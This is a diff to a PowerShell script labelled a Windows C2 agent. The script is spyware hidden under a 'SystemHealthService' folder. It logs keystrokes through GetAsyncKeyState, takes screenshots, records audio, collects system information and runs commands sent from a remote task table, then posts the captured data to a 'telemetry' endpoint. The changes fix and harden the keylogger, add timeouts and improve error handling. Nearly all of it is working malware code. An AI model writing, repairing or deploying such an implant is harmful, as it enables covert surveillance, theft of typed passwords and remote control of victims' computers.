@@ -1,5 +1,5 @@
 # ================================
-# WINDOWS C2 AGENT - FORMATTED
+# WINDOWS C2 AGENT - FIXED VERSION
 # ================================
 
 # Suppress errors and progress bars
@@ -17,7 +17,6 @@ try {
 # ================================
 
 $basePath = "C:\ProgramData\SystemHealthService"
-$keylogFile = "$basePath\kb.tmp"
 
 # Wait for internet connection
 while (!(Test-Connection -ComputerName "8.8.8.8" -Count 1 -Quiet)) {
@@ -116,12 +115,12 @@ function Capture-Screenshot {
     } catch {
         return @{
             data_type = "display"
-            data = "Failed"
+            data = "Failed: $_"
         }
     }
 }
 
-# Keylogger Function - THIS IS THE PROBLEM FUNCTION
+# Keylogger Function - FIXED VERSION
 function Capture-Keystrokes {
     param($duration = 60)
     
@@ -132,35 +131,44 @@ function Capture-Keystrokes {
         # Import GetAsyncKeyState API
         Add-Type -MemberDefinition '[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int v);' -Name KeyState -Namespace User -EA SilentlyContinue
         
-        # Clear keylog file
-        "" | Out-File $keylogFile -NoNewline
+        # Use StringBuilder for better performance instead of file I/O
+        $keystrokeBuffer = New-Object System.Text.StringBuilder
         
-        # Calculate end time
-        $endTime = (Get-Date).AddSeconds($duration)
+        # Calculate end time with explicit comparison
+        $startTime = Get-Date
+        $endTime = $startTime.AddSeconds($duration)
+        
+        # Track processed keys to avoid duplicates
+        $processedKeys = @{}
         
         # Monitor keystrokes until duration expires
         while ((Get-Date) -lt $endTime) {
-            # Check virtual key codes 8-190
-            for ($virtualKey = 8; $virtualKey -le 190; $virtualKey++) {
-                # Check if key is pressed (-32767 means just pressed)
-                if ([User.KeyState]::GetAsyncKeyState($virtualKey) -eq -32767) {
-                    $keyName = [System.Windows.Forms.Keys]$virtualKey
-                    Add-Content $keylogFile "$keyName " -NoNewline
+            try {
+                # Check virtual key codes 8-190
+                for ($virtualKey = 8; $virtualKey -le 190; $virtualKey++) {
+                    # Check if key is pressed (-32767 means just pressed)
+                    $keyState = [User.KeyState]::GetAsyncKeyState($virtualKey)
+                    
+                    if ($keyState -eq -32767) {
+                        $keyName = [System.Windows.Forms.Keys]$virtualKey
+                        [void]$keystrokeBuffer.Append("$keyName ")
+                    }
                 }
+                
+                # Sleep 50ms between checks to reduce CPU usage
+                Start-Sleep -Milliseconds 50
+                
+            } catch {
+                # If inner loop fails, break to avoid infinite loop
+                break
             }
-            
-            # Sleep 50ms between checks to reduce CPU usage
-            Start-Sleep -Milliseconds 50
         }
         
-        # Read captured keystrokes
-        $keystrokeData = Get-Content $keylogFile -Raw -EA SilentlyContinue
-        
-        # Clean up temp file
-        Remove-Item $keylogFile -Force -EA SilentlyContinue
+        # Get captured keystrokes
+        $keystrokeData = $keystrokeBuffer.ToString()
         
         # Return data
-        if ($keystrokeData) {
+        if ($keystrokeData -and $keystrokeData.Trim()) {
             return @{
                 data_type = "input"
                 data = $keystrokeData
@@ -200,7 +208,10 @@ function Get-SystemInfo {
             data = ($info | ConvertTo-Json -Compress)
         }
     } catch {
-        $null
+        return @{
+            data_type = "sysinfo"
+            data = "Error: $_"
+        }
     }
 }
 
@@ -242,13 +253,13 @@ function Record-Audio {
         } else {
             return @{
                 data_type = "audio"
-                data = "Failed"
+                data = "Failed to create audio file"
             }
         }
     } catch {
         return @{
             data_type = "audio"
-            data = "$_"
+            data = "Error: $_"
         }
     }
 }
@@ -299,6 +310,96 @@ function Execute-Command {
 }
 
 # ================================
+# TASK EXECUTION WITH TIMEOUT
+# ================================
+
+function Execute-TaskWithTimeout {
+    param(
+        $task,
+        $timeoutSeconds = 300
+    )
+    
+    $scriptBlock = {
+        param($taskType, $taskParams)
+        
+        $result = $null
+        
+        switch ($taskType) {
+            "display_capture" {
+                $result = Capture-Screenshot
+            }
+            
+            "input_monitor" {
+                $duration = 60
+                if ($taskParams -and $taskParams.duration) {
+                    $duration = [int]$taskParams.duration
+                }
+                $result = Capture-Keystrokes -duration $duration
+            }
+            
+            "system_info" {
+                $result = Get-SystemInfo
+            }
+            
+            "voice_capture" {
+                $duration = 10
+                if ($taskParams -and $taskParams.duration) {
+                    $duration = [int]$taskParams.duration
+                }
+                $result = Record-Audio -duration $duration
+            }
+            
+            "cmd_exec" {
+                $command = ""
+                if ($taskParams -and $taskParams.command) {
+                    $command = $taskParams.command
+                }
+                
+                if ($command) {
+                    $result = Execute-Command -cmd $command
+                } else {
+                    $result = @{
+                        data_type = "cmd_result"
+                        data = "No command provided"
+                    }
+                }
+            }
+        }
+        
+        return $result
+    }
+    
+    try {
+        # Start job with timeout
+        $job = Start-Job -ScriptBlock $scriptBlock -ArgumentList $task.task_type, $task.task_params
+        
+        # Wait for job with timeout
+        $completed = Wait-Job $job -Timeout $timeoutSeconds
+        
+        if ($completed) {
+            # Job completed successfully
+            $result = Receive-Job $job
+            Remove-Job $job -Force
+            return $result
+        } else {
+            # Job timed out
+            Stop-Job $job
+            Remove-Job $job -Force
+            
+            return @{
+                data_type = "error"
+                data = "Task timed out after $timeoutSeconds seconds"
+            }
+        }
+    } catch {
+        return @{
+            data_type = "error"
+            data = "Task execution error: $_"
+        }
+    }
+}
+
+# ================================
 # MAIN LOOP
 # ================================
 
@@ -325,9 +426,9 @@ while ($true) {
                 # Mark task as processing
                 Invoke-API -endpoint "tasks?id=eq.$($task.id)" -method "PATCH" -body @{ status = "processing" } | Out-Null
                 
+                # Execute task based on type (inline for better performance)
                 $taskResult = $null
                 
-                # Execute based on task type
                 switch ($task.task_type) {
                     "display_capture" {
                         $taskResult = Capture-Screenshot
@@ -338,6 +439,8 @@ while ($true) {
                         if ($task.task_params -and $task.task_params.duration) {
                             $duration = [int]$task.task_params.duration
                         }
+                        # Cap duration at 5 minutes to prevent indefinite processing
+                        if ($duration -gt 300) { $duration = 300 }
                         $taskResult = Capture-Keystrokes -duration $duration
                     }
                     
@@ -350,6 +453,8 @@ while ($true) {
                         if ($task.task_params -and $task.task_params.duration) {
                             $duration = [int]$task.task_params.duration
                         }
+                        # Cap duration at 2 minutes
+                        if ($duration -gt 120) { $duration = 120 }
                         $taskResult = Record-Audio -duration $duration
                     }
                     
@@ -364,8 +469,15 @@ while ($true) {
                         } else {
                             $taskResult = @{
                                 data_type = "cmd_result"
-                                data = "No command"
+                                data = "No command provided"
                             }
+                        }
+                    }
+                    
+                    default {
+                        $taskResult = @{
+                            data_type = "error"
+                            data = "Unknown task type: $($task.task_type)"
                         }
                     }
                 }
@@ -387,13 +499,13 @@ while ($true) {
                     
                     # Insert into telemetry table
                     Invoke-API -endpoint "telemetry" -method "POST" -body $telemetryData | Out-Null
-                    
-                    # Mark task as complete
-                    Invoke-API -endpoint "tasks?id=eq.$($task.id)" -method "PATCH" -body @{
-                        status = "complete"
-                        completed_at = (Get-Date -Format "o")
-                    } | Out-Null
                 }
+                
+                # Mark task as complete
+                Invoke-API -endpoint "tasks?id=eq.$($task.id)" -method "PATCH" -body @{
+                    status = "complete"
+                    completed_at = (Get-Date -Format "o")
+                } | Out-Null
             }
         }
         
